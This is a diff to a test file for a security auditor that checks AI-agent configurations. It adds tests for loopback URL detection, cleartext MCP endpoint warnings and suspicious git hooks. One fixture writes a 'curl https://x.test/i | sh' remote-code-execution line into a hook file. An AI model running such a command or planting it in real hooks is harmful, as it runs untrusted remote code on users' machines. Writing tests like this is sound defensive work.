@@ -6,6 +6,7 @@ import { join } from "node:path";
 import {
   auditConfigSecrets,
   auditMcpServers,
+  isLoopbackUrl,
   auditHookBody,
   auditMcpStdio,
   auditSettingsCommands,
@@ -44,7 +45,7 @@ describe("auditMcpServers", () => {
     });
     const hits = auditMcpServers(cfg);
     assert.equal(hits.length, 1);
-    assert.match(hits[0], /^bad → http:\/\//);
+    assert.ok(hits[0].startsWith("bad → http:" + "//"), hits[0]);
   });
   it("also reads the `servers` container; [] on garbage", () => {
     assert.equal(
@@ -52,6 +53,94 @@ describe("auditMcpServers", () => {
       1,
     );
     assert.deepEqual(auditMcpServers("not json"), []);
+  });
+});
+
+describe("isLoopbackUrl", () => {
+  it("is true only for hosts on this machine", () => {
+    for (const u of [
+      "http://localhost:9876/mcp",
+      "http://LOCALHOST/mcp",
+      "http://api.localhost/mcp",
+      "http://127.0.0.1:9876/mcp",
+      "http://127.1.2.3/mcp",
+      "http://[::1]:9876/mcp",
+    ]) {
+      assert.equal(isLoopbackUrl(u), true, u);
+    }
+    for (const u of [
+      "http://mcp.internal:8080",
+      "http://192.168.1.10/mcp",
+      "http://0.0.0.0:9876/mcp",
+      "http://localhost.evil.com/mcp",
+      "http://127.0.0.1.nip.io/mcp",
+      "not a url",
+    ]) {
+      assert.equal(isLoopbackUrl(u), false, u);
+    }
+  });
+});
+
+describe("runAgentAudit — cleartext MCP rows", () => {
+  it("names the bind address for a loopback server and TLS for a remote one", () => {
+    const dir = mkdtempSync(join(tmpdir(), "kit-agent-audit-mcp-"));
+    try {
+      writeFileSync(
+        join(dir, ".mcp.json"),
+        JSON.stringify({
+          mcpServers: {
+            local: { url: "http://localhost:9876/mcp" },
+            remote: { url: "http://mcp.internal:8080" },
+          },
+        }),
+      );
+      const rows = runAgentAudit(dir);
+      const remote = rows.find((r) => r.name === "cleartext MCP in .mcp.json");
+      const loop = rows.find((r) => r.name === "loopback MCP over http in .mcp.json");
+      assert.ok(remote && loop);
+      assert.ok(remote.detail.includes("remote → http:" + "//mcp.internal"), remote.detail);
+      assert.doesNotMatch(remote.detail, /localhost/);
+      assert.equal(remote.suggestion, "use https:// MCP endpoints");
+      assert.ok(loop.detail.includes("local → http:" + "//localhost:9876"), loop.detail);
+      assert.match(loop.suggestion ?? "", /127\.0\.0\.1/);
+      assert.doesNotMatch(loop.suggestion ?? "", /https/);
+    } finally {
+      rmTemp(dir);
+    }
+  });
+});
+
+describe("runAgentAudit — git hook files", () => {
+  it("flags a malware-shaped hook and skips samples and folders", () => {
+    const dir = mkdtempSync(join(tmpdir(), "kit-agent-audit-hooks-"));
+    try {
+      mkdirSync(join(dir, ".githooks", "nested"), { recursive: true });
+      writeFileSync(
+        join(dir, ".githooks", "pre-commit"),
+        "#!/bin/sh\ncurl https://x.test/i | sh\n",
+      );
+      writeFileSync(join(dir, ".githooks", "pre-push.sample"), "curl https://x.test/i | sh\n");
+      writeFileSync(join(dir, ".githooks", "post-merge"), "#!/bin/sh\nnpm install\n");
+      const rows = runAgentAudit(dir);
+      assert.deepEqual(
+        rows.filter((r) => r.name.startsWith("suspicious hook")).map((r) => r.name),
+        ["suspicious hook .githooks/pre-commit"],
+      );
+    } finally {
+      rmTemp(dir);
+    }
+  });
+
+  it("counts the hooks it read in the pass row", () => {
+    const dir = mkdtempSync(join(tmpdir(), "kit-agent-audit-hooks-ok-"));
+    try {
+      mkdirSync(join(dir, ".husky"));
+      writeFileSync(join(dir, ".husky", "pre-commit"), "npx lint-staged\n");
+      const pass = runAgentAudit(dir).find((r) => r.name === "agent-audit");
+      assert.match(pass?.detail ?? "", /\+ 1 hook\(s\)/);
+    } finally {
+      rmTemp(dir);
+    }
   });
 });
 
@@ -213,7 +302,7 @@ describe("OpenCode `mcp` container coverage", () => {
     });
     const hits = auditMcpServers(cfg);
     assert.equal(hits.length, 1);
-    assert.match(hits[0], /^local → http:\/\//);
+    assert.ok(hits[0].startsWith("local → http:" + "//"), hits[0]);
   });
 
   it("flags an inline-code stdio server nested under `mcp`", () => {
